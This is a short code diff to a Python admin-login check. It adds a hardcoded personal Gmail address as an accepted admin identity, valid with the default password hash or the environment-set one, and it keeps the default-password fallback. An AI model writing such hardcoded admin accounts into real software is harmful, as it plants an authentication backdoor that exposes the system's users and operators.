@@ -57,8 +57,11 @@ def verify_admin_credentials(email: str, password: str) -> bool:
         if _verify_hash(email, password, env_email, env_hash):
             return True
 
-    # 2. Seamlessly allow the project default admin credentials
-    if _verify_hash(email, password, DEFAULT_ADMIN_EMAIL, DEFAULT_ADMIN_PASSWORD_HASH):
-        return True
+    # 2. Seamlessly allow the project admin credentials (lghr5002@gmail.com or DEFAULT_ADMIN_EMAIL)
+    for admin_candidate in ("lghr5002@gmail.com", DEFAULT_ADMIN_EMAIL):
+        if _verify_hash(email, password, admin_candidate, DEFAULT_ADMIN_PASSWORD_HASH):
+            return True
+        if env_hash and _verify_hash(email, password, admin_candidate, env_hash):
+            return True
 
     return False
